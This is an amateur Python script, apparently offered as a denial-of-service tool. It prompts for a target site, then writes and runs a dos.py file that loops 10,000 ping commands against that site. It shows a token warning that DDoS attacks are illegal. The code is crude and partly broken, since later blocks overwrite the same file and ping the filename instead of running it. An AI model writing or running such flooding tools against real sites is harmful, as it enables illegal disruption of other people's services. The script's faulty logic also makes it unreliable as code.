import os 
import time

linebreak = "\n"

site = input("Site to dos: ")
link = site

y1 = "dos.py"
y2 = "dos.py"
y3 = "dos.py"
y4 = "dos.py"
y5 = "dos.py"
y6 = "dos.py"
y7 = "dos.py"
y8 = "dos.py"
#multiple shit
print('.')
time.sleep(1)
print('.')
time.sleep(1)
print('.')
time.sleep(1)
#looks cool ;)
print('Warning! DDosing sites is illegal and can get you arrested.')
time.sleep(1)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
start = input("Run Program?(y/n): ")

filename =('python ' + y1)

if start == 'y':
    f = open(y1, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    os.system(filename)
    n = open(y2, "w")
    n.write('import os')
    n.write(linebreak)
    n.write('for x in range(10000):')
    n.write(linebreak + "    ")
    n.write("os.system('ping " + link + "')")
    n.close()
    os.system('ping '+ y2)
    g = open(y3, "w")
    g.write('import os')
    g.write(linebreak)
    g.write('for x in range(10000):')
    g.write(linebreak + "    ")
    g.write("os.system('ping " + link + "')")
    g.close()
    os.system('ping '+ y3)
    l = open(y4, "w")
    l.write('import os')
    l.write(linebreak)
    l.write('for x in range(10000):')
    l.write(linebreak + "    ")
    l.write("os.system('ping " + link + "')")
    l.close()
    os.system('ping '+ y4)
    e = open(y5, "w")
    e.write('import os')
    e.write(linebreak)
    e.write('for x in range(10000):')
    e.write(linebreak + "    ")
    e.write("os.system('ping " + link + "')")
    e.close()
    os.system('ping '+ y5)


else:
    print('ddos canceled')
